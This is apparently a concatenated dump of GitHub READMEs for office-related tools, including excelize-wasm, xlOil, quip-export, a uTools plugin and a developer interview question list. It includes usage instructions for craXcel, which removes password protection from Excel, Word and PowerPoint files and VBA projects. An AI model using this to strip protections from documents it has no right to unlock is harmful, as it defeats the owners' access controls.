  ""groups"": [
    {
      ""id"": ""star_wars"",
      ""name"": ""Star Wars"",
      ""groupJoin"": {
        ""minimumParticipantCount"": 3
      },
      ""disabledBefore"": ""2020-05-29T17:15:00.000+02:00"",
      ""disabledAfter"": ""2020-05-29T19:00:00.000+02:00""
    }
  ],
  ""rooms"": [
    {
      ""meetingId"": ""1"",
      ""name"": ""Lobby"",
      ""subtitle"": ""This is where everything starts."",
      ""joinUrl"": ""https://zoom.us/j/1"",
      ""links"": [
        {
          ""href"": ""http://www.google.de"",
          ""text"": ""Google"",
          ""icon"": ""https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg""
        }
      ],
      ""icon"": ""https://cdn.pixabay.com/photo/2015/11/03/09/03/meeting-1019995_960_720.jpg""
    },
    {
      ""meetingId"": ""2"",
      ""name"": ""Alderaan"",
      ""joinUrl"": ""https://zoom.us/j/2"",
      ""links"": [
        {
          ""href"": ""https://www.atlassian.com"",
          ""text"": ""Issue Tracker"",
          ""icon"": ""https://pbs.twimg.com/profile_images/1026572523230515200/Qifq4jpS_400x400.jpg""
        },
        {
          ""href"": ""http://www.miro.com"",
          ""text"": ""Whiteboard"",
          ""icon"": ""https://avatars.slack-edge.com/2019-03-07/570928183895_30458630978ac1eccde9_512.png""
        }
      ],
      ""groupId"": ""star_wars"",
      ""icon"": ""https://cdn.pixabay.com/photo/2015/11/03/09/03/meeting-1019995_960_720.jpg""
    }
  ]
}
```
**Important:**
For the Zoom.us webhooks to work, the meetingId has to be the zoom.us meeting ID, as this id acts as correlation id for webhook events from zoom.

`groupJoin` within the `groups` property is optional and defines whether existing rooms will be filled up by a separate
join button on the group.

#### Admin Endpoints

You can view all available endpoints at `/api-docs`.

### Development

You have to provide configuration parameters to the server by environment variables.
As a convenient alternative you can provide it via an `.env` file (see `.env-example`) that will be loaded by [dotenv](https://www.npmjs.com/package/dotenv).

# 使用说明

## 软件设置

使用 Setting 关键字打开插件设置界面，可以根据自己拥有的软件设置相应的参数，目前需要设置的参数主要有两个：保存历史记录的**数据文件**和软件的**可执行程序路径**。

已 Visual Studio Code 为例，需要配置配置文件所在路径和可执行程序所在路径，插件会解析配置文件获得历史记录，并通过可执行文件打开历史记录。
![vscode example](https://z3.ax1x.com/2021/10/11/5Vcass.png)

有的软件不需要可执行文件路径，是因为其历史记录通常是绑定了默认的打开方式，不需要指定可执行文件去打开，如浏览器相关的书签和历史记录。
![chrome example](https://z3.ax1x.com/2021/10/11/5Vc0Zq.png)

有的软件连配置文件也不需要，这一般出现在系统特有的软件上，比如 Safari 在 macOS 上的配置文件的路径是固定的，不需要额外配置。
![safari example](https://z3.ax1x.com/2021/10/11/5VcLyd.png)

**目前大部分软件的相关配置文件的路径在插件内的说明里有详细提及，下面针对一些特殊情况进行说明。**

### Visual Studio Code

自`1.46.0`起，Visual Studio Code 将历史记录数据从`storage.json`中移除，转移到全局数据库中，所以`1.46.0`
以上版本的配置文件需要设置为`/Users/xxx/Library/Application Support/Code/User/globalStorage/state.vscdb`，在插件里，两种读取方式将分别适配，显示为两个适配。

### JetBrains

如果使用 JetBrains Toolbox 安装的话，默认路径会在类似`C:\Users\用户名\AppData\Local\JetBrains\Toolbox\apps\软件名\ch-0\版本号`，具体的可以在 JetBrains
Toolbox 的设置里找到。

### Typora

由于无法在 macOS 上找到 Typora 的配置数据文件，所以目前只支持 Windows 和 Linux，有知道的小伙伴和告诉我。

### Sublime Text

注意 Sublime Text 单独提供了命令行程序，不是程序本体，Windows 对应`subl.exe`，macOS 和 Linux 对应`subl`

### Visual Studio

如果是在官网使用官方下载器安装，那么数据文件应该在以下位置，目前方案是依据最新的 Visual Studio 2019 开发，暂不考虑过往版本  
`C:\Users\Administrator\AppData\Local\Microsoft\VisualStudio\版本号\ApplicationPrivateSettings.xml`

### Obsidian

Obsidian 没有开放获取文件列表的相关接口，解析配置文件只能得到 Vaults，所以具体的文件列表其实是遍历 Vault 对应的目录下的`md`结尾的文件，由于是遍历文件夹，所以性能可能会因为 Vault 中文件的数量太大而变差。

### Evernote (印象笔记)

Windows 下的如果想要打开具体的某篇笔记, 需要得到 User ID, 目前没有在系统里找到该参数, 需要用户手动输入, 步骤如下:

1. 随便某篇笔记选择「复制笔记链接」
2. 获得形如「https://app.yinxiang.com/shard/s48/nl/12021700/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx」这样的链接, 其中的「12021700」即为用户 ID,
   需要将其填入插件配置中

![evernote user id](https://s4.ax1x.com/2021/12/16/T9IzJe.png)

## 搜索

插件支持使用关键字在加载出来的书签记录和历史记录中进行搜索，方便查找打开，同时，**关键字支持拼音全拼匹配**。
![pingyin search](https://z3.ax1x.com/2021/10/11/5VgpY8.png)

## 插件配置

插件提供一些配置项来控制插件的一些行为，方便不同的用户使用习惯。
![plugin setting](https://z3.ax1x.com/2021/10/11/5VgilQ.png)

### 语言设置

目前提供了三种模式：自动、中文、English，尽管 uTools 可能没有国外用户，但也还是支持了 English，万一呢，对吧。
![english mode](https://z3.ax1x.com/2021/10/11/5VgkOs.png)

### 过滤不存在的文件

有一些软件的历史记录数据是定时更新的，即不是实时更新，也可能是出于其他的考虑，在源文件被删除之后，历史记录里面不会立刻将文件不存在的记录删除，所以会造成历史记录数据的冗余，为了避免过多的干扰,
可以通过这个选项将文件已经不存在的历史数据删除，这个选项只对那些历史记录是文件的软件生效，比如 wps，vscode 等。
![file filter](https://z3.ax1x.com/2021/10/11/5VgEmn.png)

### 获取 favicon

在浏览器适配的书签和历史记录里会用到，打开这个选项可以在线加载网址对应的图标
![favicon enable](https://z3.ax1x.com/2021/10/11/5VgZT0.png)
![favicon disable](https://z3.ax1x.com/2021/10/11/5VgnYT.png)

### 获取文件图标

和 favicon 类似，打开这个选项可以在结果列表里获取文件图标
![fileicon enable](https://z3.ax1x.com/2021/10/11/5VgufU.png)
![fileicon disable](https://z3.ax1x.com/2021/10/11/5VgQl4.png)

### 模糊匹配

插件默认使用的是准确匹配，即无论是输入文件名还是拼音，都需要一字不漏输入才能匹配成功，有时候确实模糊匹配会更省事，所以插件提供了模糊匹配的功能，但需要注意的是，插件的模糊匹配功能是通过文本相似度计算得到的，所以模糊匹配下会导致结果变多，难以确定唯一的结果，如果影响了搜索体验，还是使用精确匹配更加顺手。

_目前模糊匹配还处于测试阶段，还有待优化。_

# 特别说明

## 未知路径变量 Jetbrains 系列软件无法正常打开项目

JetBrains 的配置文件里面可能存在内置变量，如`$APPLICATION_CONFIG_DIR$`、`$MODULE_DIR$`、`$PROJECT_DIR$`、`$APPLICATION_HOME_DIR$`等,
这些变量插件无法主动获取，如果配置文件中存在类似的变量，将无法正常通过插件打开项目，暂时还没有好的方式能够解决这个问题，如果有朋友知道如何获取这些变量，可以告诉我适配到插件里。

## m1 mac 无法正常打开项目

关于 m1 的 mac，由于 mac 现在分为 x86 和 arm 两种 CPU 架构，所以当下原生支持 m1 的软件，如 JetBrains，都会在程序内置两套可执行程序作为入口，所以在 m1 mac
下如果按下面的文档设置可执行程序路径，会导致报错且无法执行，所以对于 m1 的 mac 需要单独配置属于 arm 架构的可执行程序路径，由于我没有 m1 的 mac，所以无法调试，需要大家自己尝试.  
目前已知的是，JetBrains 安装完成后会在`/usr/local/bin`下设置一个软链链接到正确的入口，如`/usr/local/bin/idea`，所以可以尝试将可执行程序的路径设置为这个，同样的，Visual Studio
Code 也有类似的东西。

## 适配 360 浏览器的书签和历史记录

360 安全浏览器因为安全，所以相关数据是加密过的，无法适配。

## 将所有支持的软件的记录合并在一个列表里同时查询

最开始只支持 jetbrains 和 vscode 的时候就有了，但相当一部分软件，比如 vscode 的历史记录没有最后打开时间，vscode 的 remote folder 没有具体的本地文件,
不同软件的历史记录放在一起就只能按字母排序，不能按最后操作时间来展示，而且每个软件的获取方式差异很大，同时获取有明显的短板效应，比如 xcode 和 office 都是靠命令行解析，等待时间相对 vscode 来说非常长,
整体体验下载感觉特别鸡肋，综合考虑之下就去掉了，只在同软件之间做了聚合，比如 office 或 jetbrains。

## 拼音搜索多音字识别不到

插件只是一个网页，这意味着浏览器的性能有限，无法做一些性能特别强的文字处理，此外 uTools
插件也不能保证自身在后台运行，运行时维护索引也不现实，所以最后没有采用全多音字索引，只使用了简单的拼音索引，对多音字有不小的误识别率，但好在还有拼音首字母匹配，使用体验可能比全拼要好不少。

## 开源版本和插件市场版本的区别

插件市场发布的插件版本（下简称「市场版」）和开源的代码版本（下简称「开源版」）并不完全相同，主要有两点不同

1. 市场版会**拥有开源版没有的功能**；目前计划有两类：**uTools 会员可用功能**，如插件使用统计（已上线），和**付费功能**（目前还没有）；功能的差异化是希望能够丰富 uTools 的付费生态，能够让 uTools
   活得更长久一点；  
   众所周知，国产独立软件的生态并不是很好，uTools 为开发者提供了跨平台软件化插件开发的便利，作为插件开发者自然也不能砸了这个舞台，多少做点贡献，如果你每天都用得上 uTools 的话，不妨开个会员支持一下，虽不便宜，但也不贵。  
   目前市场版拥有的免费功能未来也不会有任何限制，任何带条件的功能，都将会出现在新的功能里面，请放心食用。
2. 市场版会**比开源版获得更积极的维护**
   ；理由除了上一条提到的外，还包括本代码开源的目的，开源的其中一个重要意义是分享开发思路和经验，从来都不是为了让不愿意付费的人白嫖开发者的劳动，插件提供了部分软件的完整的历史记录获取方式，相信这对很多工具和很多人的需求有积极的意义，参考我的实现思路，去做自己的工具，这是这份开源代码的核心目标；至于及时响应用户需求，修复插件
   bug 这些事情，会反映在市场版插件里，而不是开源代码。  
   简单来说，开源版会定时推送代码，不太实时罢了；但能够承诺的是，开源版是包含了除限制功能外的所有代码，能编译也能自己打包，自行在 uTools 里打包离线使用也是没有问题的，开源代码在这方面不会打折。

# 特别感谢

[squallliu](https://gitee.com/squallliu) 提供了 Geany 的适配

# 开发说明

由于 uTools 特有的人工审核机制，官方要求模板插件的代码必须要可读，也就是源码，所以无法直接使用 webpack 等打包工具直接进行打包，因此该项目源码必须通过直接执行`build.sh`来生成打包. `build.sh`
里做的事情也很简单，将 ts 源码单独编译成 js 代码，再通过复制粘贴在 dist 文件夹下组合成需要目录结构。

> Windows 下提供了`build.ps1`作为构建脚本，需要注意的是，这个是 powershell 脚本，不是 bat 脚本。

希望 uTools 官方能早日摆脱这种代码要求，走进现代 js 开发模式 (

  f.SetCellValue('Sheet2', 'A2', 'Hello world.');
  f.SetCellValue('Sheet1', 'B2', 100);
  // Set active sheet of the workbook.
  f.SetActiveSheet(index);
  // Save spreadsheet by the given path.
  const { buffer, error } = f.WriteToBuffer();
  if (error) {
    console.log(error);
    return;
  }
  fs.writeFile('Book1.xlsx', buffer, 'binary', (error) => {
    if (error) {
      console.log(error);
    }
  });
});
```

Create spreadsheet in browser:

<details>
  <summary>View code</summary>

```html
<html>
<head>
  <meta charset=""utf-8"">

  </div>
  <script>
  function download() {
    excelizeWASM
      .init('https://<your_hostname>/excelize-wasm/excelize.wasm.gz')
      .then((excelize) => {
        const f = excelize.NewFile();
        // Create a new sheet.
        const { index } = f.NewSheet('Sheet2');
        // Set value of a cell.
        f.SetCellValue('Sheet2', 'A2', 'Hello world.');
        f.SetCellValue('Sheet1', 'B2', 100);
        // Set active sheet of the workbook.
        f.SetActiveSheet(index);
        // Save spreadsheet by the given path.
        const { buffer, error } = f.WriteToBuffer();
        if (error) {
          console.log(error);
          return;
        }
        const link = document.createElement('a');
        link.download = 'Book1.xlsx';
        link.href = URL.createObjectURL(
          new Blob([buffer], {
            type: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
          })
        );
        link.click();
      });
  }
  </script>
</body>
```

</details>

### Reading spreadsheet

The following constitutes the bare to read a spreadsheet document.

```javascript
const { init } = require('excelize-wasm');
const fs = require('fs');

init('./node_modules/excelize-wasm/excelize.wasm.gz').then((excelize) => {
  const f = excelize.OpenReader(fs.readFileSync('Book1.xlsx'));
  // Set value of a cell.
  const ret1 = f.GetCellValue('Sheet1', 'B2');
  if (ret1.error) {
    console.log(ret1.error);
    return;
  }
  console.log(ret1.value);
  // Get all the rows in the Sheet1.
  const ret2 = f.GetRows('Sheet1');
  if (ret2.error) {
    console.log(ret2.error);
    return;
  }
  ret2.result.forEach((row) => {
    row.forEach((colCell) => {
      process.stdout.write(`${colCell}\t`);
    });
    console.log();
  });
});
```

### Add chart to spreadsheet file

With excelize-wasm chart generation and management is as easy as a few lines of code. You can build charts based on data in your worksheet or generate charts without any data in your worksheet at all.

<p align=""center""><img width=""650"" src=""https://raw.githubusercontent.com/xuri/excelize-wasm/main/chart.png"" alt=""Create chart by excelize-wasm""></p>

```javascript
const { init } = require('excelize-wasm');
const fs = require('fs');

init('./node_modules/excelize-wasm/excelize.wasm.gz').then((excelize) => {
  const f = excelize.NewFile();
  [
    [null, 'Apple', 'Orange', 'Pear'],
    ['Small', 2, 3, 3],
    ['Normal', 5, 2, 4],
    ['Large', 6, 7, 8],
  ].forEach((row, idx) => {
    const ret1 = excelize.CoordinatesToCellName(1, idx + 1);
    if (ret1.error) {
      console.log(ret1.error);
      return;
    }
    const res2 = f.SetSheetRow('Sheet1', ret1.cell, row);
    if (res2.error) {
      console.log(res2.error);
      return;
    }
  });
  const ret3 = f.AddChart('Sheet1', 'E1', {
    Type: excelize.Col3DClustered,
    Series: [
      {
        Name: 'Sheet1!$A$2',
        Categories: 'Sheet1!$B$1:$D$1',
        Values: 'Sheet1!$B$2:$D$2',
      },
      {
        Name: 'Sheet1!$A$3',
        Categories: 'Sheet1!$B$1:$D$1',
        Values: 'Sheet1!$B$3:$D$3',
      },
      {
        Name: 'Sheet1!$A$4',
        Categories: 'Sheet1!$B$1:$D$1',
        Values: 'Sheet1!$B$4:$D$4',
      },
    ],
    Title: [{
      Text: 'Fruit 3D Clustered Column Chart',
    }],
  });
  if (ret3.error) {
    console.log(ret3.error);
    return;
  }
  // Save spreadsheet by the given path.
  const { buffer, error } = f.WriteToBuffer();
  if (error) {
    console.log(error);
    return;
  }
  fs.writeFile('Book1.xlsx', buffer, 'binary', (error) => {
    if (error) {
      console.log(error);
    }
  });
});
```

### Add picture to spreadsheet file

```javascript
const { init } = require('excelize-wasm');
const fs = require('fs');

init('./node_modules/excelize-wasm/excelize.wasm.gz').then((excelize) => {
  const f = excelize.OpenReader(fs.readFileSync('Book1.xlsx'));
  if (f.error) {
    console.log(f.error);
    return;
  }
  // Insert a picture.
  const ret1 = f.AddPictureFromBytes('Sheet1', 'A2', {
    Extension: '.png',
    File: fs.readFileSync('image.png'),
    Format: { AltText: 'Picture 1' },
  });
  if (ret1.error) {
    console.log(ret1.error);
    return;
  }
  // Insert a picture to worksheet with scaling.
  const ret2 = f.AddPictureFromBytes('Sheet1', 'D2', {
    Extension: '.jpg',
    File: fs.readFileSync('image.jpg'),
    Format: { AltText: 'Picture 2', ScaleX: 0.5, ScaleY: 0.5 },
  });
  if (ret2.error) {
    console.log(ret2.error);
    return;
  }
  // Insert a picture offset in the cell with printing support.
  const ret3 = f.AddPictureFromBytes('Sheet1', 'H2', {
    Extension: '.gif',
    File: fs.readFileSync('image.gif'),
    Format: {
      AltText: 'Picture 3',
      OffsetX: 15,
      OffsetY: 10,
      PrintObject: true,
      LockAspectRatio: false,
      Locked: false,
    },
  });
  if (ret3.error) {
    console.log(ret3.error);
    return;
  }
  // Save spreadsheet by the given path.
  const { buffer, error } = f.WriteToBuffer();
  if (error) {
    console.log(error);
    return;
  }
  fs.writeFile('Book1.xlsx', buffer, 'binary', (error) => {

xlOil
=====

xlOil provides framework for interacting with Excel in different programming
languages. It gives a way to write functions in a language and have them 
appear in Excel as worksheet functions or macros or have them control GUI elements. 
For example, the Python bindings can replace VBA in almost all use cases 
and even provide functionality not available from VBA.

xlOil is designed to have very low overheads when calling your worksheet 
functions.

xlOil supports different languages via plugins. The languages currently 
supported are:

- C++
- Python
- SQL

In addition there is *xlOil_Utils* which contains some handy tools which Microsoft
never quite got around to adding.

The latest stable documentation is here: https://xloil.readthedocs.io/en/stable.

xlOil features
--------------

* Python
  - Concise syntax to declare an Excel function
  - Optional type checking of function parameters
  - Supports keyword arguments
  - Choice of globally declared functions or code modules limited to a single workbook
    like VBA workbook-level functions
  - Tight integration with *numpy* - very low overheads for array functions
  - Understands python tuples, lists, dictionarys and *pandas* dataframes
  - Async functions
  - RTD functions and on-the-fly RTD server creation
  - Macro type functions which write to ranges on the sheet
  - Access to the Excel Application object and the full Excel object model
  - Drive Excel through COM automation
  - Hook Excel events
  - Pass any python object back to Excel and back into another function
  - Simple add-in deployment
  - Two-way connection to *Jupyter* notebooks: run worksheet functions in *Jupyter* and query variables
    in the *jupyter* kernel
  - Create Ribbon toolbars and Custom Task Panes
  - Return *matplotlib* plots and images from worksheet functions
* C++
  - Safe and convenient wrappers around most things in the C-API
  - Concise syntax to declare Excel functions: registration is automatic
  - Deal with Excel variants, Ranges, Arrays and strings in a natural C++ fashion
  - Object cache allows returning opaque objects to Excel and passing them back to other functions
  - Simplified RTD server creation
  - RTD-based background calculation
  - Create Ribbon toolbars and Custom Task Panes  
* SQL
  - Create tables from Excel ranges and arrays
  - Query and join them with the full sqlite3 SQL syntax
* Utils: very fast functions to:
  - Sort on multiple columns
  - Split and join strings
  - Make arrays from blocks


Supporting other languages
--------------------------

You can use xlOil as an end-user of these plugins or you can use it to write
you own language bindings (and ideally add them to the repo).",97,97,7,9,office,"[excel, office, office-addin, python, python3, sql, sqlite3, udf, xll]",0
sonnenkern,quip-export,,https://github.com/sonnenkern/quip-export,https://api.github.com/repos/quip-export/sonnenkern,Export all folders and documents from Quip,"# Quip-Export
Comprehensive full automated export (backup) tool for [Quip](https://quip.com/).

Quip-Export uses official [Quip Automation API](https://quip.com/dev/automation/documentation) and exports all documents and folders from an Quip-Account. 

Features:

* Export in HTML format with original Quip styling
* Export in MS Office format: .docx for documents, .xlsx for spresdsheets _(--docx)_ 
* Embedded CSS for HTML-export _(--embedded-styles)_
* Embedded images for HTML-export _(--embedded-images)_
* Export of comments and conversations for HTML-export _(--comments)_
* Export of specific folders only _(--folders)_ 
* Export of referenced files in documents
* Resolving of references between folders and documents to relative paths

Slides are not supported (due to poor quality of generated PDFs). Export in PDF are not supported (due to poor quality of generated PDFs).

Despite Quip-Export is designed as a standalone tool for Node.js environment, it could be also used as Quip export library for any kind of JavaScript applications. In that case, the Quip-Export project is a good usage example.
 
Quip-Export perfectly works on Windows, Mac OS and Linux/Unix in Node.js or in pure browser environment.

<p align=""center"">
  <img src=""https://raw.githubusercontent.com/sonnenkern/quip-export/master/public/demo.gif"">
</p>

## Install and usage
As mentioned before, Quip-Export tool needs Node.js (version 10.16 or higher) environment.
Node.js version check:
```
node -v
```
If Node.js is not installed or the version is lower than 10.16, please follow install/update instructions on [Node.js website](https://nodejs.org/en/).

### Use without installing locally
```
npx quip-export [options]
```
Advantage: you always run the latest version.

### Install and usage as global npm package
Install:
```
npm install -g quip-export
```

Usage example:
```
quip-export [options]
```

### Install and usage as a GitHUb project
Install:
```
git clone https://github.com/sonnenkern/quip-export.git
```

Install project dependencies:
```
cd quip-export
npm install
```

Usage example from project folder:
```
node quip-export [options]
```

### Install as an npm dependency in a project
Install:
```
npm install quip-export
```

## Options
```
  -h, --help                 Usage guide.
  -v, --version              Print version info
  -t, --token ""string""       Quip Access Token.
  -d, --destination ""string"" Destination folder for export files
  -z, --zip                  Zip export files
  --embedded-styles          Embedded in each document stylesheet
  --embedded-images          Embedded images
  --docx                     Exports documents in MS-Office format (*.docx , *.xlsx)
  --comments                 Includes comments (messages) for the documents
  --folders ""string""         Comma-separated folder's IDs to export
  --debug                    Extended logging
```

To generate a personal access token, visit the page: [https://quip.com/dev/token](https://quip.com/dev/token)

Be aware, the options --comments, --embedded-images, --embedded-styles don't work together with export in MS-Office format (--docx) and will be ignored.

The easiest way to get to know ID of Quip fodler is just to open the folder in Quip web application in browser and look at adress line. For example the adress ""https://quip.com/bGG333444111"" points to the folder with ID ""bGG333444111"".

## Usage examples
Export to folder c:\temp
```
quip-export -t ""JHHHK222333444LLL1="" -d c:\temp
```
Export to current folder as destination
```
quip-export -t ""JHHHK222333444LLL1=""
```
Export in Zip-file with current folder as destination
```
quip-export -t ""JHHHK222333444LLL1="" -z
```

## Logging
The export errors are written to file export.log in the destination folder.

## Troubleshooting
Quip-Export is strongly depending on the public [Quip Automation API](https://quip.com/dev/automation/documentation).
It is possible that some problems will occur if Quip Automation API is changed. Then Quip-Export adjustment is necessary.

Phantas0s,questions-job-interview,,https://github.com/Phantas0s/questions-job-interview,https://api.github.com/repos/questions-job-interview/Phantas0s,:office: List of questions I might ask during an interview for a software developer job,"# Questions To Ask During An Interview As a Developer

These are the questions I might ask during an interview, depending on the information I already have, the company, and everything else. I won't ask every single question, and neither should you. Life is too short.

This was, at the beginning, an aside to [this article](https://thevaluable.dev/find-best-software-developer-job/), on my blog. It grew as the time went by.

Some questions don't necessarily reveal what I want to hear, and it's on purpose. If you want to know my stand on things, you can still read my [blog](https://thevaluable.dev/). Most of the time, I focus more on the business / people / culture / processes. To me, it's where things can go eerie quickly.

## Position

* If you hire me, what would be my immediate responsibilities?

## People

### Company Culture

* How would you describe the company culture?
* How do you know if a developer is productive and valuable for the company?
* What's the balance between firefighting and project work?
* Do you think that soft skills (like communication, time management, or being able to adapt) are more important than technical skills?
* What do you do avoid developer turnover?
* Do you think diversity matters in your teams?
* How do you ensure diversity in your team?

### Control & Micro Management

* Is every developer allowed to deploy in production?
* How do you understand code ownership?
* Are there any performance reviews?

### Training 

* Do you allocate resources for employee training?

### Feedback

* Do you have any established feedback process (1-to-1) between managers and developers? 
    * Between the developers themselves? 
    * Between the teams?

## Technologies

* What's the tech stack of your codebase?
* What do you use on the infrastructure level?
* Why do you use `<insert-the-technology-they use>`?
* Can developers choose their development environments (OS, computer, IDE)?

## Business

* Why are you hiring?
* What is the vision of the company?
* How will the company look like in 5 years? 
* Do you focus on a percise target demographic?
* How do you get feedback from you users?
* What are the biggest challenges your business is facing?
* Are there domain experts who can explain some aspect of the business to the developers?

## Teams

* How many developer teams do you have?
* How may developers do you have in each team?
* Do you have product managers? Product owners?
* Are the developer teams autonomous?
* Do you have cross-functional teams?
* Are developers usually working alone on their projects?
* How do developers share knowledge in the team?

## Processes

### Agile

* Do you use SCRUM? Can you describe the process?
* Do you use Kanban? 
* What do you think about pair programming? Is it a common practice in the company?
* What do you think about code review? Is it a common practice in the company?

### Tests 

* Are you writing unit tests / functional tests / integration tests ... ?
* What do you think about TDD? Is it a common practice in the company?

### Documentation

* What does good documentation mean to you? 
* Are the codebases well documented?
* Are the features in the applications you're building well documented?

### CI / CD

* Do you have a CI pipeline?
* Do you do Continuous Deployment (CD)?
* How often do you deploy in production?
* What do you prefer: small tickets you directly deploy in production when they're done, or bigger tickets?

### Requirements

* Who is writing the requirements for new features?
* Do you have kickup meetings with domain experts, managers, and developers, when you want to add a new functionality?
* Is it possible, for developers, to change the requirements? 

## Quality

* Are you aware of your application's MTTR (Mean Time to Restore), the time you need on average to fix problems in production?
* Do you have a QA team?
* Does the QA team test manually, or do they run automated tests?
* Do you have agile ceremonies, like daily stand up?

## Working Place

* Do you allow home office?
* Do you allow remote work?
* Do you work in an open office?
* Are developers isolated or is everybody in the same offices?
* Can I visit the offices?

## Schedule 

* Are the work hours flexible?

## Deadlines

* Who schedules the deadlines? How?
* Are estimations considered as hard deadlines?
* Is it possible to change the scope of the tasks if it's clear that the deadlines are too short?
* Do you think a ""healthy"" amount of pressure on developers is necessary for them to do their best work?

## Legacy Systems and Complexity

* Do you consider part of your codebase as legacy? Why?
* Do you have some practices or processes to avoid technical debt?
* Does the management know the cost of complexity in the codebase?
* How do you reduce the entropy in your codebase?

## Holidays

* How many days of vacation do we have?
* Is it possible to have unpaid sabbatical? (months)

## Trial Day

* Can I do a payed trial day to get to know each other better?

## To ask to the IT team If Trial Day

* Would you refer this company to a friend?
* What would you change in this company?
* What the most interesting things you've worked on here?
* Are deployments stressful? Why?
* Why do you stay in this company?

    office, _ := libreofficekit.NewOffice(""/path/to/libreoffice"")
    document, _ := office.LoadDocument(""kittens.docx"")

    rectangles := document.GetPartPageRectangles()
    canvasWidth := libreofficekit.TwipsToPixels(rectangles[0].Dx(), 120)
    canvasHeight := libreofficekit.TwipsToPixels(rectangles[0].Dy(), 120)

    m := image.NewRGBA(image.Rect(0, 0, canvasWidth, canvasHeight))

    for i, rectangle := range rectangles {
        document.PaintTile(unsafe.Pointer(&m.Pix[0]), canvasWidth, canvasHeight, rectangle.Min.X, rectangle.Min.Y, rectangle.Dx(), rectangle.Dy())
        libreofficekit.BGRA(m.Pix)

# What is craXcel

craXcel (""crack-cel"") is a tool that makes removing various password protections from Microsoft Office files seemless. It works by directly amending the underlying XML files that make up modern Microsoft Office files.

Please note that craXcel cannot unlock encrypted files.

---

# Supported applications

As of V2.0:

- Microsoft Excel (workbook, worksheet, vba)
  - .xlsx
  - .xlsm
- Microsoft Word (modify, format, vba)
  - .docx
  - .docm
- Microsoft Powerpoint (modify, vba)
  - .pptx
  - .pptm

Others may work, but have not been tested.

## Important note on unlocking the VBA project of macro files

Upon unlocking the VBA Project of a Macro Enabled file, that file will state it has encountered issues and needs to recover... __DO NOT PANIC__, this is normal.

The steps to follow to complete the unlock is as follows:

1. Open the unlocked file and click 'Enable Content' on the warning:

![image](https://user-images.githubusercontent.com/50495755/94193731-9e2e0b80-fea8-11ea-818f-45ac9ac7b80e.png)

2. Click 'OK' on the following pop-up:

![image](https://user-images.githubusercontent.com/50495755/94193790-b56cf900-fea8-11ea-8f73-2b27378b1e3d.png)

3. Open Visual Basic from the Developer toolbar:

![image](https://user-images.githubusercontent.com/50495755/94193894-d59cb800-fea8-11ea-9cc6-6a88008a853e.png)

4. Open VBAProject Propeties under Tools:

![image](https://user-images.githubusercontent.com/50495755/94193982-f5cc7700-fea8-11ea-8dad-9d0ccb3cf921.png)

5. Navigate to the Protection tab and enter a new password (a one character password is fine, as we will be removing it again straight away). Click 'OK'.

![image](https://user-images.githubusercontent.com/50495755/94194050-0ed52800-fea9-11ea-9cf9-315a1a0fc7fc.png)

6. Head back in to VBAProject Properties > Protection tab, and de-select the 'Lock project for viewing' checkbox and clear any passwords in the boxes below. Click 'OK'.

7. The modules will now be unlocked and you can save the document without having to repeat these steps.

## Installation

### Prerequisites								
1. Download and install Python (v3+) (https://www.python.org/downloads/)								

### Step-by-Step								
1. Clone or download the repository from GitHub to a local folder of your choosing								
1. Open a terminal of your choice (i.e. cmd, powershell, bash)								
1. In the terminal navigate to the folder with craxcel (from step 1)								
    - If you're not familiar with how to do this, search online for: ""[name of terminal] change directory""								
1. In the terminal, enter the command: __pip install -r requirements.txt__							
    - If you have trouble, try opening the terminal as an administrator								
1. You are now good to go! Refer to the Usage section below for instructions on how to use craXcel								

### If You Get Stuck…								
- Guide to Downloading and Installing Python (https://realpython.com/installing-python/)							
- Cloning a GitHub Repository (https://help.github.com/en/github/creating-cloning-and-archiving-repositories/cloning-a-repository)								

## Usage

### Basic			
1. Open a terminal of your choice (i.e. cmd, powershell, bash)								
1. In the terminal, navigate to the folder with craxcel								
1. In the terminal, enter the command: python craxcel.py yourfilename.xlsx								
    - The terminal doesn't necessarily have to be in the same folder as craxcel, and nor does your file								
    - If craxcel is not located in the current directory, simply give the terminal the full path, i.e.:								
      - __python 'c:/users/me/downloads/craxcel/craxcel.py' yourfile.xlsx__						
    - The same applies in the case of your file, simply give the terminal the full path, i.e.:								
      - __python craxcel.py 'c:/users/me/documents/yourfile.xlsx'__								
    - And you can, of course, combine these for both if required, i.e.:								
      - __python 'c:/users/me/downloads/craxcel/craxcel.py' 'c:/users/me/documents/yourfile.xlsx'__
1. The unlocked file will be saved in the created 'unlocked' folder where the app is installed

### List Mode
craXcel also has the ability to unlock multiple files at a time!

1. Create a .txt file with a line for each filepath (see __file-list-example.txt__ for an example)
1. Instead of entering the filename of an individual Microsoft Office application, enter the .txt filename
1. Finish the command by entering '--list', i.e.
   - __python craxcel.py 'c:/users/me/documents/list-of-files.txt' --list__

### Options								
- craXcel has several options that can be passed in for more advanced uses, i.e.:			
  - Unlock the VBA Project (macro file) of a macro enabled file
    - __python craxcel.py yourfile.xlsm --vba__
  - Selecting to only remove Workbook protection (leaving Worksheet protection intact)								
    - __python craxcel.py yourfile.xlsx -wb__						
  - Selecting to only remove Worksheet protection (leaving Workbook protection intact)								
    - __python craxcel.py yourfile.xlsx -ws__						
  - Run without deleting the temporary XML files							
    - __python craxcel.py yourfile.xlsx --debug__							
- For a full list of options, enter the command: __python craxcel.py --help__

The popup will always be on top(Can be changed in the settings)so that you will never miss it if you are on your computer/laptop at the time the reminder pops up

# Did you know?

1) RemindMe can also be used to set quick timers, for example 1 hour, 5 minutes, etc. [Take a look how](https://github.com/Stefangansevles/RemindMe/blob/master/How%20to%20Use%20RemindMe.md#did-you-know--timers)

2) RemindMe can create Advanced Reminders which opens up the possibility to **execute batch code** when the reminder pops up! I'll leave the possibilities with that up to you ;) [Take a look how](https://github.com/Stefangansevles/RemindMe/blob/master/How%20to%20Advanced%20Reminders.md#2-windows-batch-script-code)

3) RemindMe can create Advanced **conditional** Reminders which ping an API to evaluate 1, or more conditions! [Click here to read more](https://github.com/Stefangansevles/RemindMe/blob/master/How%20to%20Advanced%20Reminders.md#1-api-support)

You can install RemindMe by downloading the installer and running it. ([SetupRemindMe.msi](https://github.com/Stefangansevles/RemindMe/blob/master/SetupRemindMe.msi))

RemindMe lurks in the windows system tray and will not show itself until you double click the icon, or right click it and select show RemindMe

elework,Spreadsheet,elework,https://github.com/elework/Spreadsheet,https://api.github.com/repos/Spreadsheet/elework,A spreadsheet app designed for elementary OS.,"# Spreadsheet

